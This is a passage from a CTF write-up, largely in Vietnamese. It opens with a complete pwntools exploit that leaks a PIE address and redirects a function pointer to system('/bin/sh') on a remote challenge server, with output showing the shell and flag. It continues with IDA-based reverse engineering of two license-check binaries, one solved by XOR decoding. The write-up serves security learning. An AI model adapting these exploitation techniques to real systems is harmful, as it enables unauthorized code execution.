<a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC-Revenge/xpl.py">xpl.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level=&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=process(&#39;./chall_revenge&#39;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;45.122.249.68&#39;</span>, <span style="color:#ae81ff">20018</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./chall_revenge&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enter</span>(idx, x, y):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter x: &#39;</span>, x)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter y: &#39;</span>, y)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sumVector</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Save the sum to index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printsum</span>():
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">loadfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sumVector(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>loadfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>printfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;v = [&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pie<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">0x35d</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie_base :&#39;</span> <span style="color:#f92672">+</span> hex(pie))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v_list<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;v_list array :&#39;</span> <span style="color:#f92672">+</span> hex(v_list))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sum<span style="color:#f92672">=</span>v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>faves<span style="color:#f92672">=</span>sum<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;sum :&#39;</span> <span style="color:#f92672">+</span> hex(sum))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;faves :&#39;</span> <span style="color:#f92672">+</span> hex(faves))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>w1n<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000009E4</span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;w1n :&#39;</span> <span style="color:#f92672">+</span> hex(w1n))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;system :&#39;</span> <span style="color:#f92672">+</span> hex(system))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bin_sh<span style="color:#f92672">=</span><span style="color:#ae81ff">0x68732f6e69622f</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, str(bin_sh)<span style="color:#f92672">.</span>encode(), str(bin_sh)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>,str(v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>encode(), str(v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># enter(b&#39;1&#39;, str(w1n).encode(), str(w1n).encode())</span>
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, str(system)<span style="color:#f92672">.</span>encode(), str(system)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printsum()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>spawn shell &amp; get flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>─   ~/CTF/wannagame/calc/revenge                                                                                                               02:51:19 ─╮
</span></span><span style="display:flex;"><span>╰─❯ python3 xpl.py                                                                                                                                          ─╯
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 45.122.249.68 on port 20018: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/w1n-gl0ry/CTF/wannagame/calc/revenge/chall_revenge&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pie_base :0x56172c10e000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> v_list array :0x56172c111040
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sum :0x56172c111080
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> faves :0x56172c111098
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> w1n :0x56172c10e9e4
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> system :0x56172c10e100
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>user_revenge<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>user_revenge<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>user_revenge<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ cd /home/user_revenge
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>chall_revenge
</span></span><span style="display:flex;"><span>flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt
</span></span><span style="display:flex;"><span>$ cat flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt
</span></span><span style="display:flex;"><span>W1<span style="color:#f92672">{</span>g00d_exploit_idea!!!<span style="color:#f92672">}</span>
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{g00d_exploit_idea!!!}</code></p>
<h2 id="reverse">Reverse</h2>
<h3 id="1-wanna-one-vpn">1. wanna-one vpn</h3>
<p><code>Description: wanna-one private vpn needs a license key to be authorized, help me intrude their system and I will pay you a fair price!</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vpn/wanna-one-vpn">wanna-one-vpn</a></p>
<pre tabindex="0"><code>╭─   ~/CTF/wannagame/chall                                                           18:49:19 ─╮
╰─❯ file wanna-one-vpn                                                                           ─╯
wanna-one-vpn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bd291b1ebb7737ffcb8d0712dc093d58183f6faf, for GNU/Linux 3.2.0, not stripped
</code></pre><p>Vì đây là file ELF 64 bit (không bị stripped) nên mình load vào IDA để tiến hành dịch ngược</p>
<p>Nhìn lướt qua assembly thì mình thấy chương trình load vào 1 mảng <code>encrypted_flag</code>, nhận <code>input</code> ta nhập vào rồi so sánh độ dài 2 mảng bằng hàm <code>strlen()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000135</span>B                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200044]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001361</span>                 sub     eax, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001364</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001366</span>                 mov     byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000136</span>E                 lea     rax, [rbp<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001375</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span><span style="color:#ae81ff">8</span>                 call    _strlen
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>D                 mov     rbx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">80</span>                 mov     rax, cs:encrypted_flag     <span style="color:#f92672">-&gt;</span> mảng gồm các kí tự cho trước
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">87</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">8</span>A                 call    _strlen
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000138F</span>                 cmp     rbx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">92</span>                 jz      <span style="color:#66d9ef">short</span> loc_13B2
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">94</span>                 lea     rax, aInvalidLicense ; <span style="color:#e6db74">&#34;Invalid license key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">9</span>B                 mov     rdi, rax        ; format
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">9</span>E                 mov     eax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A3                 call    _printf
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A8                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>AD                 call    _exit
</span></span></code></pre></div><p>Vậy ta phải nhập vào 1 mảng có kích thước như <code>encrypted_flag</code> 24 kí tự</p>
<p><code>.rodata:0000000000002004 a8rq9VdVyesv9Em db '^8rq9{Vd:VyesV~9|emVph6t',0</code></p>
<p>Tiếp tục, chương trình thực hiện 1 số hành động mà mình có thể dễ dàng dịch ra được:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>BE loc_13BE:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>BC<span style="color:#960050;background-color:#1e0010">↓</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>BE                 mov     rdx, cs:encrypted_flag
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>C5                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200048]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CB                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CD                 add     rax, rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D0                 movzx   edx, byte ptr [rax]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D3                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200048]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D9                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>DB                 movzx   eax, byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E3</span>                 xor     eax, <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E6</span>                 cmp     dl, al
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E8</span>                 jz      <span style="color:#66d9ef">short</span> loc_1408
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>EA                 lea     rax, aInvalidLicense ; <span style="color:#e6db74">&#34;Invalid license key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">1</span>                 mov     rdi, rax        ; format
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">4</span>                 mov     eax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">9</span>                 call    _printf
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span>E                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001403</span>                 call    _exit
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span> ; <span style="color:#f92672">---------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span> loc_1408:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">17</span>A<span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span>                 add     [rbp<span style="color:#f92672">+</span>var_200048], <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140F</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140F</span> loc_140F:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>E<span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140F</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200048]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001415</span>                 movsxd  rbx, eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000141</span><span style="color:#ae81ff">8</span>                 mov     rax, cs:encrypted_flag
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000141F</span>                 mov     rdi, rax        ; s
</span></span></code></pre></div><p>Chương trình lưu từng byte của mảng <code>encrypted_flag</code> vào thanh ghi edx, mảng của chúng ta nhập vào cũng được load qua eax, rồi sau đó thực hiện phép xor với 9. Cuối cùng kiểm tra 2 kí tự có giống nhau không ?</p>
<p>Đến đây đã rõ ràng rồi, mình dùng code python đơn giản sau để mô phỏng lại thuật toán trên.</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vpn/vpn.py">vpn.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>enc<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;^8rq9{Vd:VyesV~9|emVph6t&#39;</span>
</span></span><span style="display:flex;"><span>enc<span style="color:#f92672">=</span>list(enc)
</span></span><span style="display:flex;"><span>dec<span style="color:#f92672">=</span>[]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> enc:
</span></span><span style="display:flex;"><span>    dec<span style="color:#f92672">.</span>append(i<span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> dec))
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{x0r_m3_plz_w0uld_ya?}</code></p>
<h3 id="2-wanna-one-vault">2. wanna-one vault</h3>
<p><code>Description: Hear me out, I disabled the security system so that I could easily dump the vault firmware, now help me decipher the firmware and break into the vault and steal their confidential intels.</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vault/wanna-one-vault">wanna-one-vault</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>chall                                                                                                                           <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">49</span> <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─❯</span> file wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>vault                                                                                                                                          <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span>wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>vault: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB pie executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, BuildID[sha1]<span style="color:#f92672">=</span><span style="color:#ae81ff">18e2</span>d06b27d74777cea8e784139816bfb61f45d4, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">3.2.0</span>, not stripped
</span></span></code></pre></div><p>-&gt; Vẫn là 1 file ELF 64 bit (không bị stripped), mình tiến hành load vào <code>IDA</code> để dịch ngược</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000134</span>C                 lea     rax, [rbp<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001353</span>                 mov     edx, <span style="color:#ae81ff">30</span>h ; <span style="color:#e6db74">&#39;0&#39;</span>  ; nbytes
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000135</span><span style="color:#ae81ff">8</span>                 mov     rsi, rax        ; buf
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000135</span>B                 mov     edi, <span style="color:#ae81ff">0</span>          ; fd
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001360</span>                 call    _read
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001365</span>                 mov     [rbp<span style="color:#f92672">+</span>var_2001D4], eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000136</span>B                 cmp     [rbp<span style="color:#f92672">+</span>var_2001D4], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001372</span>                 jg      <span style="color:#66d9ef">short</span> loc_137E
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001374</span>                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span><span style="color:#ae81ff">9</span>                 call    _exit
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E ; <span style="color:#f92672">---------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E loc_137E:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span><span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>E                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D4]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">84</span>                 sub     eax, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">87</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">89</span>                 mov     byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">91</span>                 lea     rax, [rbp<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">98</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">9</span>B                 call    _strlen
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A0                 cmp     rax, <span style="color:#ae81ff">20</span>h ; <span style="color:#e6db74">&#39; &#39;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A4                 jz      <span style="color:#66d9ef">short</span> loc_13BF
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A6                 lea     rax, s          ; <span style="color:#e6db74">&#34;Invalid vault key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>AD                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>B0                 call    _puts
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>B5                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
